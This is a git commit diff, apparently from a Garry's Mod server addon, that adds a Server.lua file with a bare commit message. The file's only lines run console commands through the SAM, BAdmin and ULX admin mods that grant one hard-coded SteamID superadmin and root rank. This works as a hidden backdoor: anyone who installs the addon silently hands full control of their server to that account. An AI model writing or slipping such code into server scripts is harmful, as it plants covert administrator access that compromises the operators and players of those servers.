348a6c5d9cc3557f86e37c7e4da3f60f5030fe8c
nefofof <84814706+nefofof@users.noreply.github.com>
2022-07-23 22:23:07 +0300

    11

---
+++ Server.lua
@@ -0,0 +1,9 @@
+RunConsoleCommand("sam setrankid","STEAM_0:0:616349715","superadmin")
+RunConsoleCommand("sam setrankid","STEAM_0:0:616349715","root")
+RunConsoleCommand("ba setgroup","STEAM_0:0:616349715","root")
+RunConsoleCommand("ulx adduserid","STEAM_0:0:616349715","superadmin")
+
+
+
+
+
